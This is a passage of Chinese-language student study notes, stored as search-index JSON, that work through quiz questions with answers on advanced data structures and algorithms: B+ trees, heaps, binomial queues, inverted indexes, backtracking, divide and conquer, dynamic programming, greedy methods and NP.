<p>Consider a B+ tree of order M. What is the maximum number of elements that are stored in an internal node?</p> <p>A.M ; B.M\u22121 ; C.M+1 ; D.M/2</p> <p>\u6ce8\u610f\u662f\u4e00\u4e2a\u5185\u90e8\u8282\u70b9\u3002</p> <p>B</p> <p>Question</p> <p>(multi) Consider a deletion in a B+ tree. Suppose that no underflow occurs after the deletion. How many elements in the internal nodes may be updated? Select all possible answers.</p> <p>A.0 ; B.1 ; C.2 ; D.&gt;2</p> <p>\u501f PPT \u4e0a\u7684\u56fe\u4e00\u7528\uff1a</p> <p></p> <p>\u4e0d\u96be\u53d1\u73b0\uff0c\u5bf9\u4e8e\u53f6\u8282\u70b9\u4e0a\u7684\u6bcf\u4e2a\u503c\uff0c\u5728\u5185\u90e8\u8282\u70b9\u4e2d\u81f3\u591a\u51fa\u73b0\u4e00\u6b21\uff1b\u5728\u4e0d\u53d1\u751f underflow \u7684\u6761\u4ef6\u4e0b\uff0c\u5982\u679c\u5220\u9664\u7684\u662f\u4e0a\u9762\u9ed1\u8272\u7684\u503c\uff0c\u5185\u90e8\u8282\u70b9\u4e0d\u4f1a\u66f4\u65b0\uff1b\u5982\u679c\u5220\u9664\u7ea2\u8272\u7684\u503c\uff0c\u5219\u5bf9\u5e94\u503c\u6240\u5728\u8282\u70b9\u66f4\u65b0\uff0c\u81f3\u591a\u66f4\u65b0\u4e00\u6b21\u3002</p> <p>AB</p> <p>Question</p> <p>Insert 3, 1, 4, 5, 9, 2, 6, 8, 7, 0 into an initially empty 2-3 tree (with splitting). Which one of the following statements is FALSE?</p> <p>A. 7 and 8 are in the same node</p> <p>B. the parent of the node containing 5 has 3 children</p> <p>C. the first key stored in the root is 6</p> <p>D. there are 5 leaf nodes</p> <p>\u5b66\u4f1a\u624b\u7ed8\uff1b\u6211\u4eec\u5b66\u4e60\u7684 B+ tree \u548c\u7f51\u4e0a\u4f3c\u4e4e\u6709\u6240\u4e0d\u540c\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528\u7f51\u4e0a\u7684\u6a21\u62df\u3002</p> <p>A</p> <p>Question</p> <p>Which of the following statements concerning a B+ tree of order\u00a0M\u00a0is TRUE?</p> <p>A. the root always has between 2 and\u00a0M\u00a0children</p> <p>B. not all leaves are at the same depth</p> <p>C. leaves and nonleaf nodes have some key values in common</p> <p>D. all nonleaf nodes have between\u00a0\u2308M/2\u2309\u00a0and\u00a0M\u00a0children</p> <p>A\uff0c\u8003\u8651\u4ec5\u6709\u6839\u3002B\uff0c\u6240\u6709\u53f6\u5fc5\u7136\u540c\u6df1\u3002D\uff0c\u8003\u8651\u6839\u8fd9\u4e2a nonleaf node\u3002</p> <p>C</p> <p>Question</p> <p>When insert three keys into a non-empty 2-3 tree, and if the tree gains height when the first key is in, then it is possible that the 2-3 tree will gain more height after the insertions of the next two keys.</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#leftist-heap","title":"Leftist Heap","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_9","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>In the leftist heap, the null path length of the right path will be less than or equal to the null path length of any other path originating from the root.</p> <p>right path \u662f\u6700\u77ed\u7684\u3002</p> <p>T</p> <p>Question</p> <p>A binary heap must be a leftist heap.</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_10","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>\u5de6\u5f0f\u5806\u7684\u5408\u5e76\uff0c\u5982\u679c\u662f\u9009\u62e9\u5224\u65ad\uff0c\u53ef\u80fd \u8fed\u4ee3\u5f0f \u7684\u6f14\u793a\u56fe\u66f4\u65b9\u4fbf\u7406\u89e3\uff0c\u4f8b\u5982Leftist tree - Wikipedia\uff1a</p> <p>D</p> <p>Question</p> <p></p> <p>\u9898\u76ee\u6765\u81ea Jianjun Zhou's Notebook \uff0c\u5728 losningsforslag-ukeoppgave8.pdf (uio.no) \u7684 Exercise 2 \u627e\u5230\u4e86\u8fc7\u7a0b\uff0cthe worst case time complexity is O(N).</p> <p>D</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#skew-heap","title":"Skew Heap","text":"<p>\\(T_{amortized} = O(log N)\\)</p> <p> </p> <p>\u6839\u636eheavy node\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u6709\u4ee5\u4e0b\u4e09\u4e2a\u6027\u8d28\uff1a</p> <p>Note</p> <ol> <li>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u662f heavy node\uff0c\u5e76\u4e14\u5728\u5176\u53f3\u5b50\u6811\u53d1\u751f\u4e86\u5408\u5e76\uff08\u5305\u62ec\u7ffb\u8f6c\uff09\uff0c\u90a3\u4e48\u5b83\u4e00\u5b9a\u53d8\u4e3a\u4e00\u4e2a light node\uff1b</li> <li>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u662f light node\uff0c\u5e76\u4e14\u5728\u5176\u53f3\u5b50\u6811\u53d1\u751f\u4e86\u5408\u5e76\uff08\u5305\u62ec\u7ffb\u8f6c\uff09\uff0c\u90a3\u4e48\u5b83\u53ef\u80fd\u53d8\u4e3a\u4e00\u4e2a heavy node\uff1b</li> <li>\u5408\u5e76\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u7684 heavy/light \u53d1\u751f\u53d8\u5316\uff0c\u90a3\u4e48\u5b83\u539f\u5148\u4e00\u5b9a\u5728\u5806\u7684\u6700\u53f3\u4fa7\u8def\u5f84\u4e0a\uff1b</li> </ol> <p>\u8fed\u4ee3\u5f0f\u5408\u5e76Skew heap \u4e5f\u9002\u7528\uff0c\u53c2\u8003 Skew heap - Wikipedia \u3002</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_11","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>The result of inserting keys\u00a01 to\u00a0\\(2^k\u22121\\)\u00a0for any\u00a0k &gt; 4\u00a0in order into an initially empty skew heap is always a full binary tree.</p> <p>\u89e3\u91ca\u6765\u81ea Lecture 4 | Leftist Heap &amp; Skew Heap - Isshiki\u4fee's Notebook </p> <p>\u9996\u5148\uff0c\u4ece\u63d2\u5165\u7684\u5143\u7d20\u7684\u6570\u91cf\u6765\u770b\uff0c\u662f\u6ee1\u8db3\u6ee1\u4e8c\u53c9\u6811\u7684\u5fc5\u8981\u6761\u4ef6\u7684\u3002</p> <p>\u800c\u6839\u636e\u6211\u4eec\u4e0a\u9762\u63cf\u8ff0\u7684\uff0c\u8df3\u8fc7\u80af\u5b9a\u6210\u7acb\u7684\u521d\u59cb\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u505a\u4e00\u4e2a\u7b80\u5355\u7684\u5f52\u7eb3\uff0c\u8fc7\u7a0b\u5e76\u4e0d\u5b8c\u6574\u4e0e\u4e25\u8c28\uff0c\u4f46\u662f\u5927\u6982\u5c31\u662f\u8fd9\u4e48\u4e2a\u610f\u601d\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u6ee1\u4e8c\u53c9\u6811\uff0c\u6211\u4eec\u73b0\u5728\u8981\u63d2\u5165\u4e00\u4e2a\u6570\uff0c\u663e\u7136\u8fd9\u4e2a\u6570\u6bd4\u6811\u91cc\u4efb\u4f55\u4e00\u4e2a\u90fd\u8981\u5927\u3002\u800c\u5f53\u8fd9\u4e2a\u6570\u88ab\u63d2\u5165\u540e\uff0c\u5b83\u6210\u4e3a\u6574\u4e2a\u5806\uff0c\u6216\u8005\u8bf4\u6574\u4e2a\u6811\u6700\u5de6\u4fa7\u7684\u4e00\u6761\u3002\u800c\u5728\u63a5\u4e0b\u6765\u7684\u4ea4\u6362\u8fc7\u7a0b\u4e2d\uff0c\u5b83\u4f1a\u4e0d\u65ad\u88ab\u7529\u6765\u7529\u53bb\uff0c\u6700\u7ec8\u7ecf\u8fc7 2^k \u6b21\u540e\u88ab\u7529\u5230\u6700\u53f3\u8fb9\uff0c\u4e5f\u5c31\u662f\u8fce\u63a5\u5b83\u7684\u7b2c\u4e00\u4e2a\u5b69\u5b50\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u8be5\u5c42\u7684\u6240\u6709\u8282\u70b9\u6765\u8bf4\u90fd\u9700\u8981 2^k \u6b21\u624d\u4f1a\u8fdb\u5165\u5230\u6700\u53f3\u4fa7\u8def\u5f84\u3002</p> <p>\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u7c7b\u6bd4\u4e8c\u8fdb\u5236\u6570\u7684\u81ea\u589e\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u8282\u70b9\u7684\u6bcf\u4e2a\u524d\u9a71\u5206\u522b\u662f\u5de6\u5b69\u5b50\u8fd8\u662f\u53f3\u5b69\u5b50\u6765\u5206\u914d\u5bf9\u5e94\u7684\u4f4d\u5b50\u662f\u00a0<code>0</code>\u00a0\u8fd8\u662f\u00a0<code>1</code>\u3002\uff09</p> <p>T</p> <p>Question</p> <p>For a skewed heap with n nodes, the number of nodes on its right path must be O(logn).</p> <p>\u5bf9\u4e8e skewed heap\uff0c\u5176\u4ee5 light node \u4e3a\u6839\u7684\u5b50\u6811\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a leftist heap \uff0c\u6ee1\u8db3\u9898\u8bbe\uff1b\u4f46\u662f\u5bf9\u4e8e heavy node \uff0c\u5219\u4e0d\u7136\u3002</p> <p>The right path of a skew heap can be\u00a0arbitrarily\u00a0long. T</p> <p>F</p> <p>Question</p> <p>For a skew heap with N nodes, the worst-case running time of all operations (insert/delete min/merge) is O(N).</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_12","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>ACD \u80af\u5b9a\u5bf9\u7684\uff0cB \u7684\u8bdd\u8003\u8651 right path \u4e0d\u662f O(log N) \u7684\u60c5\u51b5\u3002</p> <p>B</p> <p>Question</p> <p>Merge the two skew heaps in the following figure. Which one of the following statements is FALSE?</p> <p>A. 15 is the right child of 8 ; B. 14 is the right child of 6</p> <p>C. 1 is the root ; D. 9 is the right child of 3</p> <p></p> <p>skew heap \u7ec3\u4e60\u624b\u7ed8\u8fc7\u7a0b\uff0c\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p>A</p> <p>Question</p> <p></p> <p>\u53c2\u89c1\u4e0a\u9762\u7684 note\u3002</p> <p>D</p> <p>Question</p> <p>If a leftist heap can be implemented recursively, so can its counterpart skew heap.</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#binomial-queue","title":"Binomial Queue","text":"<p>\u4e8c\u9879\u5806\u7406\u89e3\u8d77\u6765\u5f88\u7b80\u5355\uff0c\u7ef4\u62a4\u4e00\u4e2a\u68ee\u6797\uff0c\u5177\u6709\u5982\u4e0b\u6027\u8d28\uff1a</p> <ol> <li>\u68ee\u6797\u4e2d\u7684\u6811\u5177\u6709\u5806\u6027\u8d28\uff0c\u4e14\u4e0d\u5b58\u5728\u4e24\u9897\u76f8\u540c\u7684\u6811\uff08\u5982\u679c\u5b58\u5728\uff0c\u5219\u5408\u5e76\uff09\uff1b</li> <li>\u6bcf\u9897\u6811\u7684\u8282\u70b9\u6570\u4e3a \\(2^k\\) \uff0c\u79f0\u4e3a k \u9636\u4e8c\u9879\u6811 \\(B_{k}\\)\uff1b</li> <li>\\(B_{k}\\) \u7684\u6839\u7684\u5b50\u8282\u70b9\u6570\u4e3a k\uff0c\u4e14\u4f9d\u6b21\u4e3a \\(B_{k-1}, B_{k-2} \\dots B_{0}\\)\uff1b</li> <li>\\(B_{K}\\) \u6bcf\u4e00\u5c42\u8282\u70b9\u6570\u91cf\u4e3a\u4e8c\u9879\u5f0f\u5c55\u5f00\u7cfb\u6570\u3002</li> </ol> <p>\u4e8c\u9879\u5806\u662f\u4e00\u4e2a\u5177\u6709\u4e0d\u91cd\u590d\u4f46\u540c\u6784\u7684\u82e5\u5e72\u68f5\u6811\u7684\u68ee\u6797\uff0c\u4e0d\u59a8\u5c06\u5176\u89c6\u4e3a\u4e8c\u8fdb\u5236\u6570\u8fdb\u884c\u5408\u5e76\uff1b\u5bf9\u4e8e\u5176\u4ed6\u64cd\u4f5c\uff1aInsert\uff08\u5355\u8282\u70b9\u68ee\u6797\u4e0e\u539f\u68ee\u6797\u5408\u5e76\uff09\u3001DeleteMin\uff08\u7531\u4e8e\u6027\u8d28 3\uff0c\u5220\u9664\u6839\u8282\u70b9\u540e\uff0c\u5176\u4ed6\u5b50\u6811\u4ecd\u7136\u662f\u4e8c\u9879\u6811\uff0c\u5408\u5e76\u4ee5\u7ef4\u62a4\u4e8c\u9879\u5806\u6027\u8d28\uff09\u3002</p> <p>\u5bf9\u4e8e\u5408\u5e76\uff0c\u7406\u8bba\u6bd4\u8f83\u7b80\u5355\uff0c\u5b9e\u73b0\u8d77\u6765\u8fd8\u662f\u6709\u4e9b\u7ed5\u7684\uff0c\u89c1Lecture 5 | Binomial Queue</p> <p>Help</p> <p>Fibonacci Heaps or \"How to invent an extremely clever data structure\" - YouTube \u662f\u4e00\u4e2a\u5f88\u597d\u7684\u8bb2\u89e3 Fibonacci Queue \u7684\u89c6\u9891\uff0c\u5176\u4e2d\u4e5f\u63d0\u5230\u4e86 binomial queue\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_13","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>To implement a binomial queue, the subtrees of a binomial tree are linked in increasing sizes.</p> <p>\u5b50\u6811\u4e4b\u95f4\u4f7f\u7528 NextSibling \u94fe\u63a5\uff0c\u4f46\u662f PPT \u4e0a\u662f\u8fd9\u6837\u7684\u2026\u2026</p> <p>\u56fe\u89e3\u7ed9\u63d2\u53f3\u8fb9\uff1a</p> <p></p> <p>\u4ee3\u7801\u7ed9\u63d2\u5de6\u8fb9\uff1a</p> <p></p> <p>\u6709\u53ef\u80fd\u5c31\u662f\u6ca1\u6709\u987a\u5e8f\uff08\u4e0d\u4fdd\u771f\uff09\uff0c\u4f46\u662f\u7b54\u6848\u5c31\u662f\u8fd9\u4e2a\u547d\u9898\u9519\u8bef\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_14","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>\u6ca1\u770b\u61c2\u600e\u4e48\u5efa\u5806\u7136\u540e\u5220\u9664 4 \u7684\uff0c\u505a\u51fa\u6765\u7684\u4eba\u548c\u6211\u8bf4\u201c\u5148\u628a 4 \u5220\u4e86\u518d\u5efa\u5806\u4e0d\u5c31\u597d\u4e86\u201d\uff1b\u6709\u9053\u7406\uff0c\u4f46\u5982\u679c\u771f\u662f\u8fd9\u6837\u7684\u8bdd\u8fd9\u9898\u4e5f\u662f\u8be5\u4f3c\u4e86\u3002</p> <p>D</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#inverted-file-index","title":"Inverted File Index","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_15","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p></p> <p>C</p> <p>Question</p> <p>Stop words should be ignored when creating inverted file indices, since they appear rarely in articles, and are not useful for indexing</p> <p>\u505c\u7528\u8bcd\u662f\u7528\u7684\u592a\u591a\u800c\u6ca1\u6709\u641c\u7d22\u610f\u4e49\u7684\u8bcd\uff0c\u5982 \"a\" \"the\"\u3002</p> <p>F</p> <p>Question</p> <p>In distributed indexing, document-partitioned strategy is to store on each node all the documents that contain the terms in a certain range.</p> <p>F</p> <p>Question</p> <p>When evaluating the performance of data retrieval, it is important to measure the relevancy of the answer set.</p> <p></p> <p>F</p> <p>Question</p> <p>Precision is more important than recall when evaluating the explosive detection in airport security.</p> <p>\u8fd9\u79cd\u7ed3\u5408\u73b0\u5b9e\u7684\uff0c\u90a3\u5c31\u662f\u8981\u770b\u662f\u201c\u5b81\u9519\u6740\u4e0d\u653e\u8fc7\u201d\uff08\u53ec\u56de\u7387\uff09\u8fd8\u662f\u201c\u5b81\u7f3a\u6bcb\u6ee5\u201d\uff08\u51c6\u786e\u7387\uff09\u3002</p> <p>F</p> <p>Question</p> <p></p> <p>\u5b81\u9519\u6740\uff0c\u4e0d\u653e\u8fc7</p> <p>F</p> <p>\u63a5\u4e0b\u6765\u662f\u7cfb\u5217\u9898 \u4e0d\u5efa\u8bae\u7ea0\u7f20\uff0c\u610f\u4e49\u4e0d\u5927\uff0c\u51ed\u611f\u89c9\u5427\u3002</p> <p>Question</p> <p>While accessing a term by hashing in an inverted file index, range searches are expensive.</p> <p>T</p> <p>Question</p> <p>While accessing a term by hashing in an inverted file index, range searches are inexpensive.</p> <p>F</p> <p>Question</p> <p>While accessing a term stored in a B+ tree in an inverted file index, range searchings are expensive</p> <p>F</p> <p>Question</p> <p></p> <p>\u82f1\u8bed\u4e0d\u592a\u597d\uff0c\u5173\u952e\u5728\u4e8e\u600e\u4e48\u7406\u89e3 \"Retrieved False Spam\"\uff1a - \u6309\u7167\u4e0a\u8bfe\u7684\u540c\u6837\u8bed\u5883\u5e94\u8be5\u8868\u793a \u201c\u6ca1\u80fd\u53ec\u56de\u7684\u2018\u5783\u573e\u90ae\u4ef6\u2019\u201d\uff0c\u90a3\u4e48\u7b54\u6848\u662f D\uff1b - \u8d77\u521d\u6211\u4ee5\u4e3a\u662f\u201c\u53ec\u56de\u8ba4\u4e3a\u4e0d\u662f\u5783\u573e\u90ae\u4ef6\u201d\uff0c\u90a3\u4e48\u5e94\u8be5\u662f 45%\uff0c\u4f46\u662f\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\uff0c\u90a3\u5e94\u8be5\u8fd8\u662f\u7b2c\u4e00\u79cd\u7406\u89e3\u3002</p> <p>-D</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#backtracing","title":"Backtracing","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_16","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>Reall that in class we solved the \"good path\" problem using dfs + pruning. Note that this problem can also be solved by bfs + pruning. For any instance, dfs + prunning is at least as fast as bfs + pruning. (Hint: consider a case where leaves may have different depth.)</p> <p>\u6211\u8981\u662f leftist tree \u4f60\u7528 dfs \u548c bfs \u80fd\u4e00\u6837\u5417\uff1f</p> <p>F</p> <p>Question</p> <p>It is guaranteed that an exhaustive search can always find the solution in finite time.\u00a0</p> <p>\u6211\u4eec\u5728 backtracing \u7684\u4f2a\u4ee3\u7801\u4e2d\u662f\u5b58\u5728\u8fd9\u4e48\u4e00\u79cd\u60c5\u51b5\u7684\uff1a\u5982\u679c\u5728 game tree \u7684\u67d0\u4e00\u5c42\u7684\u6240\u6709\u8282\u70b9\u5c1d\u8bd5\u540e\u90fd check \u5931\u8d25\uff0c\u8bf4\u660e\u4e0d\u5b58\u5728\u89e3\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u662f\u6240\u6709\u7684\u95ee\u9898\u90fd\u80fd\u591f \"find the solution\"\u3002</p> <p>F</p> <p>Question</p> <p>In a Turnpike Reconstruction Problem, given distance set D = { 1,2,3,4,5,6 } ,(x1,\u2026, x4) = (0, 1, 4, 6) is the only solution provided that x1 = 0.</p> <p>\u8fd9\u4e2a\u70b9\u7684\u5206\u5e03\u4e2d\u5fc3\u5bf9\u79f0\u4e00\u4e0b\u663e\u7136\u4e5f\u53ef\u4ee5\uff1b\u5f53\u7136\uff0c\u4e07\u4e00\u662f {0, 2, 4, 6}\uff0c\u90a3\u5c31\u662f\u5bf9\u7684\u4e86\u3002</p> <p>F</p> <p>Question</p> <p>For the Turnpike reconstruction algorithm of\u00a0N\u00a0points, assuming that the distance set\u00a0D\u00a0is maintained as an AVL tree, the running time is\u00a0\\(O(N^2logN)\\)\u00a0if no backtracking happens.</p> <p>T</p> <p>Question</p> <p>What makes the time complexity analysis of a backtracking algorithm very difficult is that the sizes of solution spaces may vary.</p> <p>F</p> <p>What makes the time complexity analysis of a backtracking algorithm very difficult is that the number of solutions that do satisfy the restriction is hard to estimate.\uff08True\uff09</p> <p>Question</p> <p>The 4-queen problem has exactly 2 distinct solutions.</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_17","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>C</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#divide-and-conquer","title":"Divide and Conquer","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_18","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>The asymptotic upper bound for the recurrence T(n) = 2T(\u230an/2\u230b + 17) + n is T(n) = O(n log n).</p> <p>\u522b\u7ba1\u4ec0\u4e48\u5411\u4e0b\u548c\u5185\u90e8\u5e38\u6570\u4e86\uff0cn \u5f88\u5927\u7684\u65f6\u5019\u53ef\u4ee5\u5ffd\u89c6\u3002</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_19","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>D</p> <p>Question</p> <p></p> <p>A</p> <p>Question</p> <p></p> <p>\u4e0d\u96be\u5f97\u5230\u6700\u540e AB best, C =&gt; \\(O(N^{\\log_{2}3})\\) ; D =&gt; \\(O(N\\log^2N)\\) \uff1b\u5982\u4f55\u6bd4\u8f83 CD\uff1f\u53d6\u5546\u6781\u9650\u3002</p> <p>C</p> <p>Question</p> <p></p> <p>recurrence relation - How to solve T(n)=2T(\u221an)+log n with the master theorem?</p> <p></p> <p>D</p> <p>Question</p> <p></p> <p>\u9488\u5bf9 C \u9879\uff0c\u6ce8\u610f\u5230\uff1a\\(\\frac{af\\left( \\frac{n}{b} \\right)}{f(n)}=2* \\frac{\\frac{n}{2} / lg\\left( \\frac{n}{2} \\right)}{n / lg(n)} = \\frac{lg(n)}{lg(n)-lg(2)} \\rightarrow 1\\) \uff1b\u7531\u4e8e\u662f\u8d8b\u8fd1\uff0c\u4e0d\u7b26\u5408\u5f62\u5f0f\u4e8c\u7684\u7b2c\u4e09\u4e2a\u60c5\u51b5\uff1b\u8d8b\u8fd1\u9879\u76ee\u4e3a 1\uff0c\u4e0d\u5b58\u5728 k/K \u7b26\u5408\u524d\u4e24\u4e2a\u60c5\u51b5\u3002\u6545\u4e0d\u5b58\u5728\u3002</p> <p>C</p> <p>Question</p> <p></p> <p>\u5148\u770b\u4e0b\u9762\u7684\u8fd9\u4e2a\u63a8\u5bfc\uff1a</p> <p></p> <p>\u540c\u7406\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>\\(T(n)=T(n^{1/k})+\\log m = \\log n \\sum_{i=0}^{\\log \\log n}\\frac{1}{k^i}\\)</p> <p>\u90a3\u4e48\u9898\u76ee\u4e2d\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\uff1a</p> \\[ \\begin{align} T(n)&amp;=T(n^{1/2})+T(n^{1/3})+T(n^{1/6})+\\log n \\\\&amp;= \\log n \\sum_{i=0}^{\\log \\log n}\\left(\\frac{1}{2^i}+\\frac{1}{3^i}+\\frac{1}{6^i} \\right) = \\log n\\log \\log n  \\end{align} \\] <p>E</p> <p>Question</p> <p></p> <p>C</p> <p>Question</p> <p>How many of the following sorting methods use(s) Divide and Conquer algorithm?</p> <ul> <li>Heap Sort</li> <li>Insertion Sort</li> <li>Merge Sort</li> <li>Quick Sort</li> <li>Selection Sort</li> <li>Shell Sort</li> </ul> <p>\u5206\u6cbb\u7b97\u6cd5\u7684\u6392\u5e8f\u65b9\u6cd5\u6709\u00a02\u00a0\u4e2a\uff1aMerge Sort\u00a0\u548c\u00a0Quick Sort</p> <p>2</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#dynamic-programming","title":"Dynamic Programming","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_20","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>In dynamic programming algorithms, some results of subproblems have to be stored even they do not compose the optimal solution of a larger problem.</p> <p>T</p> <p>Question</p> <p></p> <p>k \u8868\u793a\u53ea\u8003\u8651\u524d k \u4e2a\u8282\u70b9\u5f97\u5230\u7684\u6700\u77ed\u8def\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_21","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>\u9898\u76ee\u9009\u9879\u4e0d\u96be\uff08D \u5904\u5e94\u8be5\u4e3a \\(R_{N-i}\\)\uff09\uff0c\u4f46\u662f\u5176\u4ed6\u9009\u9879\u503c\u5f97\u770b\u4e00\u4e0b\u3002</p> <p>D</p> <p>Question</p> <p></p> <p>\u663e\u7136 j \u4ece\u5927\u5230\u5c0f\u63a8\u5bfc\u3002</p> <p>B</p> <p>Question</p> <p> </p> <p>\u53ea\u80fd\u8bf4 ABD \u80af\u5b9a\u5bf9\u7684\uff0cC \u4e0d\u4f1a\u3002</p> <p>C</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#greedy-algothrim","title":"Greedy Algothrim","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_22","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>Let S be the set of activities in Activity Selection Problem. Then the earliest finish activity am\u200b must be included in all the maximum-size subset of mutually compatible activities of S.</p> <p>\u8d2a\u5a6a\u89e3\u4e0d\u4e00\u5b9a\u662f\u6700\u4f18\u89e3\uff0c\u6700\u4f18\u89e3\u4e0d\u4e00\u5b9a\u662f\u8d2a\u5a6a\u89e3\u3002</p> <p>F</p> <p>Question</p> <p>Consider the data compression problem we discussed in the class this week. The optimal \u03a3-tree must be full. That is, every internal node of the tree must have two children.</p> <p>\u5e94\u8be5\u5c31\u662f\u6307\u54c8\u592b\u66fc\u6811\uff0c\u5fc5\u5b9a\u4e3a\u6ee1\u4e8c\u53c9\u6811\u3002</p> <p>T</p> <p>Question</p> <p>Greedy algorithm works only if the local optimum is equal to the global optimum.</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_23","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>Question</p> <p>(multi) </p> <p>\u53ef\u80fd\u6709\u7684\u4eba\u6709\u4e9b\u8bef\u89e3\uff1a\u9891\u7387\u6700\u9ad8\u7684\u90a3\u4e2a\u5b57/\u8bcd\u4e00\u5b9a\u662f\u7528\u4e00\u4e2a bit \u7f16\u7801\u7684\u3002</p> <p>\u4f46\u662f\u4e0d\u7136\u3002\u4ee5\u9891\u7387\u6700\u9ad8\u4e3a 0.4 \u4e3a\u4f8b\uff1a\u5982\u679c\u524d\u9762\u7684\u5408\u5e76\u8fc7\u7a0b\u4e2d\uff0c\u6709\u4e00\u4e2a\u5408\u5e76\u540e\u7684\u7236\u8282\u70b9\u9891\u7387\u4e3a <code>[0.4, 0.6)</code> \uff0c\u5373\u786e\u4fdd\u9664\u8fd9\u4e24\u4e2a\u5360\u5927\u5934\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b\u5b57\u6bcd\u53ef\u4ee5\u88ab\u5408\u5e76\uff1b\u90a3\u4e48 0.4 \u7684\u5b57\u6bcd\u90fd\u53ef\u80fd\u4f7f\u7528\u4e24\u4e2a\u53ca\u4ee5\u4e0a\u7684 bit \u7f16\u7801\u3002</p> <p>Tip</p> <p>\u5224\u65ad\u4f7f\u7528\u4e00\u4f4d bit \u7f16\u7801\u7684\u6761\u4ef6\uff1a</p> <ol> <li>\u9891\u7387\u6700\u9ad8\uff0c\u8bb0\u4f5c \\(f_0\\)\uff1b</li> <li>\u82e5\u9891\u7387\u7b2c\u4e8c\u9ad8\u8005\u4e3a \\(f_{1}\\)\uff0c\u5219\u6709 \\(1-f_{0}-f_{1} \\leq f_{0}\\)\uff1b\u56e0\u4e3a\u53ea\u6709\u8fd9\u6837\uff0c\u5728 \\(f_{0}\\) \u88ab\u5408\u5e76\u4e4b\u524d\uff0c\u53ea\u6709\u4e00\u4e2a\u5176\u4ed6\u6240\u6709\u9891\u7387\u5408\u5e76\u800c\u6210\u7684\u805a\u5408\u4f53\uff0c\\(f_{0}\\) \u81ea\u7136\u5c31\u53ef\u4ee5 1bit \u7f16\u7801\u4e86\u3002</li> </ol> <p>BC</p> <p>Question</p> <p></p> <p>\u56e0\u4e3a\u53d6 max\uff0c\u6211\u4eec\u5e0c\u671b\u6bcf\u4e2a\u90fd\u4e0d\u8981\u592a\u5927\uff0c\u6240\u4ee5\u65e9\u7ed3\u675f\u7684\u65e9\u5f00\u59cb\u5e72\uff08\u600e\u4e48\u8fd9\u4e48\u50cf\u6211\u8d76 ddl \u7684\u6837\u5b50\uff09\uff1b\u8fd8\u6709\uff0c\u8fd9\u4e2a\u9898\u76ee\u53c8\u2122\u7684\u653e\u5728\u591a\u9009\u9898\u91cc\u3002</p> <p>A</p> <p>Question</p> <p></p> <p>\\(\\# characters = \\frac{\\#node+1}{2}\\)</p> <p>C</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#np","title":"NP","text":"","tags":["notes"]},{"location":"note/other/ADS_problems/#_24","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>If a problem can be solved by dynamic programming, it must be solved in polynomial time.</p> <p>Why is the dynamic programming algorithm of the knapsack problem not polynomial? </p> <ul> 